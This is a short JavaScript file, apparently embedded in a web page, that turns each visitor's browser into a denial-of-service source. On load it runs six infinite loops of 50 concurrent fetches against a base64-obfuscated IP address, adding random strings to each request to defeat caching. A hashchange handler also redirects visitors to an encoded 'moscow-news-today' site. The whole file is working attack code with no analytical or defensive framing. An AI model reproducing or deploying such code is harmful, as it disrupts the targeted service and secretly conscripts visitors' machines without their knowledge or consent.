function onHandle(str) {
  const REPORT_INTERVAL = 1000;
const REQUEST_TIMEOUT_BASE = 500;
const CONCURRENCY = 50;
const PAYLOAD_SIZE = 2_000; // bytes

const generateRandomString = (nChars) => {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';

    for (let i = 0; i < nChars; i++) {
        result += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    }

    return result;
}

const sendRequest = async (target, timeout) => {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);

    try {
        await fetch(target, {
            mode: 'no-cors',
            signal: controller.signal,
        });

        clearTimeout(timeoutId);
    } catch (e) {
        clearTimeout(timeoutId);
    }
}

    const target = atob(str);

    let nRequests = 0n;
    let payload = generateRandomString(PAYLOAD_SIZE);


    // report nRequests every second and change payload/headers
    setInterval(() => {
        payload = generateRandomString(PAYLOAD_SIZE);
        self.postMessage(nRequests);
        nRequests = 0n;
    }, REPORT_INTERVAL);

    const queue = [];

    while (true) {
        if (queue.length >= CONCURRENCY) {
            await queue.shift();
            continue;
        }

        const timeoutRand = Math.round(Math.random() * 100) - 50;
        queue.push(sendRequest(
            `${target}?${Math.random()}${payload.toString()}`,
            REQUEST_TIMEOUT_BASE + timeoutRand,
        ));

        nRequests++;
    }
}

var init = 'aHR0cHM6Ly8xNzguMjQ4LjIzNC43Ng==';
if (false) {
  Array.from({length: 6}).forEach(() => {
    var pollingWorker = new Worker('polling.js');
    pollingWorker.postMessage(init);
  })
} else {
  Array.from({length: 6}).forEach(() => {
    onHandle(init);
  })
}

window.addEventListener('hashchange', function () {
  window.location = atob('aHR0cHM6Ly9tb3Njb3ctbmV3cy10b2RheS5uZXRsaWZ5LmFwcC8=');
})